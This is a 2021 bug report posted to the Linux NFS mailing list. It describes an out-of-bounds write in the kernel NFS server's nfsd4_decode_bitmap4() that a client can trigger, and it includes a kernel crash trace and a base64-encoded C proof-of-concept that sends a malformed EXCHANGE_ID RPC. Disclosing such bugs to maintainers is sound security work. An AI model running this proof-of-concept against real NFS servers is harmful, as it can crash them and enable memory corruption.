Return-Path: <linux-nfs-owner@vger.kernel.org>
X-Original-To: lists+linux-nfs@lfdr.de
Delivered-To: lists+linux-nfs@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id CD90244F554
	for <lists+linux-nfs@lfdr.de>; Sat, 13 Nov 2021 21:58:47 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S234306AbhKMVBi (ORCPT <rfc822;lists+linux-nfs@lfdr.de>);
        Sat, 13 Nov 2021 16:01:38 -0500
Received: from outgoing-stata.csail.mit.edu ([128.30.2.210]:54071 "EHLO
        outgoing-stata.csail.mit.edu" rhost-flags-OK-OK-OK-OK)
        by vger.kernel.org with ESMTP id S232203AbhKMVBi (ORCPT
        <rfc822;linux-nfs@vger.kernel.org>); Sat, 13 Nov 2021 16:01:38 -0500
Received: from c-24-60-30-97.hsd1.ma.comcast.net ([24.60.30.97] helo=crash.local)
        by outgoing-stata.csail.mit.edu with esmtpsa (TLS1.2:DHE_RSA_AES_256_CBC_SHA256:256)
        (Exim 4.82)
        (envelope-from <rtm@csail.mit.edu>)
        id 1mm06l-000NtS-Jp; Sat, 13 Nov 2021 15:58:43 -0500
Received: from crash.local (localhost [127.0.0.1])
        by crash.local (Postfix) with ESMTP id C3DA01330982C;
        Sat, 13 Nov 2021 15:58:42 -0500 (EST)
To:     "J. Bruce Fields" <bfields@fieldses.org>,
        Chuck Lever <chuck.lever@oracle.com>
cc:     linux-nfs@vger.kernel.org
From:   rtm@csail.mit.edu
Reply-To: rtm@csail.mit.edu
Subject: NFS client can crash server due to overrun in nfsd4_decode_bitmap4()
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=-=-="
Date:   Sat, 13 Nov 2021 15:58:42 -0500
Message-ID: <97860.1636837122@crash.local>
Precedence: bulk
List-ID: <linux-nfs.vger.kernel.org>
X-Mailing-List: linux-nfs@vger.kernel.org

--=-=-=
Content-Type: text/plain

nfsd4_decode_bitmap4() will write beyond bmval[bmlen-1] if the RPC
directs it to do so. This can cause nfsd4_decode_state_protect4_a() to
write client-supplied data beyond the end of
nfsd4_exchange_id.spo_must_allow[] when called by
nfsd4_decode_exchange_id().

I've attached a demo in which the client's EXCHANGE_ID RPC supplies an
address (0x400) that nfsd4_decode_bitmap4() writes into
nii_domain.data due to overflowing bmval[]. The EXCHANGE_ID RPC also
supplies a zero-length eia_client_impl_id<>. The result is that
copy_impl_id() (called by nfsd4_exchange_id()) tries to read from
address 0x400.

# cc nfsd_1.c
# uname -a
Linux (none) 5.15.0-rc7-dirty #64 SMP Sat Nov 13 20:10:21 UTC 2021 riscv64 riscv64 riscv64 GNU/Linux
# ./nfsd_1
...
[   16.600786] Unable to handle kernel NULL pointer dereference at virtual address 0000000000000400
[   16.643621] epc : __memcpy+0x3c/0xf8
[   16.650154]  ra : kmemdup+0x2c/0x3c
[   16.657733] epc : ffffffff803667bc ra : ffffffff800e80fe sp : ffffffd000553c20
[   16.777502] status: 0000000200000121 badaddr: 0000000000000400 cause: 000000000000000d
[   16.788193] [<ffffffff803667bc>] __memcpy+0x3c/0xf8
[   16.796504] [<ffffffff8028cf0e>] nfsd4_exchange_id+0xe6/0x406
[   16.806159] [<ffffffff8027c352>] nfsd4_proc_compound+0x2b4/0x4e8
[   16.815721] [<ffffffff80266782>] nfsd_dispatch+0x118/0x172
[   16.823405] [<ffffffff807633fa>] svc_process_common+0x2de/0x62c
[   16.832935] [<ffffffff8076380c>] svc_process+0xc4/0x102
[   16.840421] [<ffffffff802661de>] nfsd+0x102/0x16a
[   16.848520] [<ffffffff80025b60>] kthread+0xfe/0x110
[   16.856648] [<ffffffff80003054>] ret_from_exception+0x0/0xc


--=-=-=
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=nfsd_1.c
Content-Transfer-Encoding: base64

I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHN0ZGxpYi5o
PgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxz
eXMvaW9jdGwuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPHN5cy93YWl0Lmg+
CiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4KI2luY2x1ZGUgPGFycGEvaW5ldC5oPgojaW5jbHVk
ZSA8YXNzZXJ0Lmg+CgojZGVmaW5lIE5BQSAxMjgKdW5zaWduZWQgbG9uZyBsb25nIGFhW05BQV0g
PSB7CjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDEwMDAwMDAwMDAw
MDAwMHVsbCwKMHhkMDAwMDAwMDEwMDAwMDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweGYyNjE2ZTYy
dWxsLAoweDQwMDAwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwK
MHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAow
eDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4
MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgw
dWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1
bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVs
bCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxs
LAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGws
CjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwK
MHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAow
eDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4
MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgw
dWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1
bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVs
bCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxs
LAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAoweDB1bGws
CjB4MHVsbCwKMHgwdWxsLAoweDB1bGwsCjB4MHVsbCwKMHgwdWxsLAp9OwppbnQgYWFpID0gMDsK
CmNoYXIgb2J1Zls0MDk2XTsKaW50IG9pID0gMDsKCmludCBzOyAvLyBzb2NrZXQgZmQKaW50IHhp
ZCA9IDE7Cgp2b2lkCnB1dDMyKHVuc2lnbmVkIGludCB4KQp7CiAgYXNzZXJ0KChvaSAlIDQpID09
IDApOwogICooaW50Kikob2J1ZitvaSkgPSBodG9ubCh4KTsKICBvaSArPSA0Owp9Cgp2b2lkCnB1
dDY0KHVuc2lnbmVkIGxvbmcgbG9uZyB4KQp7CiAgcHV0MzIoeCA+PiAzMik7CiAgcHV0MzIoeCk7
Cn0KCnZvaWQKcHV0X29wYXF1ZShpbnQgbiwgY2hhciAqYnVmKQp7CiAgcHV0MzIobik7CiAgZm9y
KGludCBpID0gMDsgaSA8IG47IGkrKykKICAgIG9idWZbb2krK10gPSAoYnVmID8gYnVmW2ldIDog
MCk7CiAgd2hpbGUoKG4lNCkhPTApewogICAgb2J1ZltvaSsrXSA9IDA7CiAgICBuKys7CiAgfQp9
Cgp2b2lkCnB1dF9zaWQoY2hhciAqc2lkKQp7CiAgZm9yKGludCBpID0gMDsgaSA8IDE2OyBpKysp
ewogICAgb2J1ZltvaSsrXSA9IChzaWQgPyBzaWRbaV0gOiAwKTsKICB9Cn0KCnZvaWQKcHV0X3Jl
c2V0KCkKewogIG9pID0gNDsgLy8gbGVhdmUgcm9vbSBmb3IgcGFja2V0IGxlbmd0aAp9Cgp2b2lk
CnNlbmRfc2VuZCgpCnsKICBhc3NlcnQob2kgPj0gNCk7CiAgYXNzZXJ0KChvaSAlIDQpID09IDAp
OwogIGFzc2VydChvaSA8PSBzaXplb2Yob2J1ZikpOwogIGFzc2VydChhYWkgPD0gTkFBKTsKICAq
KGludCopKG9idWYrMCkgPSBodG9ubCgob2kgLSA0KSB8IDB4ODAwMDAwMDApOwogIHByaW50Zigi
d3JpdGluZyAlZFxuIiwgb2kpOwogIGlmKHdyaXRlKHMsIG9idWYsIG9pKSA8PSAwKSBwZXJyb3Io
IndyaXRlIik7CiAgb2kgPSAwOwp9Cgp2b2lkCnB1dF9ycGNfaGVhZGVyKGludCBwcm9jKQp7CiAg
cHV0X3Jlc2V0KCk7CiAgcHV0MzIoeGlkKyspOwogIHB1dDMyKDApOyAvLyBtdHlwZT1DQUxMCiAg
cHV0MzIoMik7IC8vIHJwYyB2ZXJzaW9uCiAgcHV0MzIoMTAwMDAzKTsgLy8gcHJvZyAjCiAgcHV0
MzIoNCk7IC8vIHByb2cgdmVycwogIHB1dDMyKHByb2MpOyAvLyBwcm9jCiAgaWYocHJvYyA9PSAw
KXsKICAgIHB1dDMyKDApOyAvLyBjcmVkIHR5cGUKICAgIHB1dDMyKDApOyAvLyBjcmVkIGxlbgog
IH0gZWxzZSB7CiAgICBwdXQzMigxKTsgLy8gY3JlZCB0eXBlIEFVVEhfU1lTIC8gQVVUSF9VTklY
CiAgICBwdXQzMigyOCk7IC8vIGNyZWQgbGVuZ3RoCiAgICBwdXQzMigwKTsgLy8gc3RhbXAKICAg
IHB1dF9vcGFxdWUoOSwgImxvY2FsaG9zdCIpOwogICAgcHV0MzIoNjU1MzQpOyAvLyB1aWQKICAg
IHB1dDMyKDY1NTM0KTsgLy8gZ2lkCiAgICBwdXQzMigwKTsgLy8gIyBnaWRzCiAgfQogIHB1dDMy
KDApOyAvLyB2ZXJmIHR5cGUKICBwdXQzMigwKTsgLy8gdmVyZiBsZW4KfQoKdm9pZApzZW5kX25v
cCgpCnsKICBwdXRfcnBjX2hlYWRlcigwKTsKICBzZW5kX3NlbmQoKTsKfQoKdm9pZApzZW5kX2V4
Y2hhbmdlX2lkKCkKewogIHB1dF9ycGNfaGVhZGVyKDEpOwoKICAvLyBjb21wb3VuZCBoZWFkZXIK
ICBwdXRfb3BhcXVlKDAsICIiKTsgLy8gdGFnCiAgcHV0MzIoMik7IC8vIG1pbm9yIHZlcnNpb24K
ICBwdXQzMigxKTsgLy8gMSBvcGVyYXRpb24gaW4gdGhlIGNvbXBvdW5kCgogIGludCB4b2kgPSBv
aTsKICBwdXQzMig0Mik7IC8vIG9wZXJhdGlvbiA0MjogRVhDSEFOR0VfSUQKICBwdXQ2NCgxKTsg
Ly8gdmVyaWZpZXI0CiAgcHV0X29wYXF1ZSgyMiwgIkxpbnV4IE5GU3Y0LjIgcG9vYnVudHUiKTsg
Ly8gY29fb3duZXJpZAogIHB1dDMyKDB4MTAzKTsgIC8vIGZsYWdzCiAgcHV0MzIoMCk7IC8vIFNQ
NF9OT05FCiAgcHV0MzIoMSk7IC8vIGxlbmd0aCBvZiBjbGllbnRfaW1wbF9pZAogIHB1dF9vcGFx
dWUoMTAsICJrZXJuZWwub3JnIik7IC8vIG5paV9kb21haW4KICBwdXRfb3BhcXVlKDQsICJibGFo
Iik7IC8vIG5paV9uYW1lCiAgcHV0NjQoMCk7IC8vIG5mc3RpbWU0CiAgcHV0MzIoMCk7IC8vIG5m
c3RpbWU0CgogIGZvcihpbnQgaSA9IHhvaTsgaSA8IG9pOyBpICs9IDgpCiAgICAqKGxvbmcgbG9u
ZyAqKShvYnVmK2kpIF49IGFhW2FhaSsrXTsKCiAgc2VuZF9zZW5kKCk7Cn0KCmludAptYWluKCl7
CiAgc2V0bGluZWJ1ZihzdGRvdXQpOwogIHN0cnVjdCBybGltaXQgcjsKICByLnJsaW1fY3VyID0g
ci5ybGltX21heCA9IDA7CiAgc2V0cmxpbWl0KFJMSU1JVF9DT1JFLCAmcik7CgogIHN5c3RlbSgi
ZXhwb3J0ZnMgLWEiKTsKICBzeXN0ZW0oIi9ldGMvaW5pdC5kL3JwY2JpbmQgc3RhcnQiKTsKICBz
eXN0ZW0oIi91c3Ivc2Jpbi9ycGMubmZzZCAtLWxlYXNlLXRpbWUgMTAgLS1ncmFjZS10aW1lIDEw
IDEiKTsKICBzbGVlcCgxKTsKICBzeXN0ZW0oIi91c3Ivc2Jpbi9ycGMubW91bnRkIC0tbWFuYWdl
LWdpZHMiKTsKICBzbGVlcCgxKTsKICBzeXN0ZW0oImV4cG9ydGZzIC1hIik7CiAgLy9zeXN0ZW0o
ImV4cG9ydGZzIC12Iik7CiAgLy9zeXN0ZW0oInJwY2RlYnVnIC1tIG5mc2QgLXMgYWxsIik7CiAg
Ly9zeXN0ZW0oInJwY2RlYnVnIC1tIHJwYyAtcyBhbGwiKTsKCiAgcyA9IHNvY2tldChBRl9JTkVU
LCBTT0NLX1NUUkVBTSwgMCk7CiAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsKICBtZW1zZXQoJnNp
biwgMCwgc2l6ZW9mKHNpbikpOwogIHNpbi5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKICBzaW4uc2lu
X2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCIxMjcuMC4wLjEiKTsKICBzaW4uc2luX3BvcnQgPSBo
dG9ucyg4MDEpOwogIGlmKGJpbmQocywgKHN0cnVjdCBzb2NrYWRkciAqKSZzaW4sIHNpemVvZihz
aW4pKSA8IDApewogICAgcGVycm9yKCJiaW5kIik7CiAgICBleGl0KDEpOwogIH0KCiAgc2luLnNp
bl9wb3J0ID0gaHRvbnMoMjA0OSk7CgoKICBpZihjb25uZWN0KHMsIChzdHJ1Y3Qgc29ja2FkZHIg
Kikmc2luLCBzaXplb2Yoc2luKSkgPCAwKSB7CiAgICBwZXJyb3IoImNvbm5lY3QiKTsKICAgIGV4
aXQoMSk7CiAgfQoKICBzZW5kX25vcCgpOwogIHsKICAgIHByaW50Zigid2FpdGluZyBmb3Igbm9w
IHJlcGx5XG4iKTsKICAgIGNoYXIgaWJ1ZlsyMDQ4XTsKICAgIGludCBjYyA9IHJlYWQocywgaWJ1
Ziwgc2l6ZW9mKGlidWYpKTsKICAgIHByaW50ZigicmVhZCAlZFxuIiwgY2MpOwogIH0KCiAgc2Vu
ZF9leGNoYW5nZV9pZCgpOwoKICBzbGVlcCgyKTsKCiAgCiAgY2xvc2Uocyk7CiAgc2xlZXAoMSk7
Cgp9Cg==
--=-=-=--
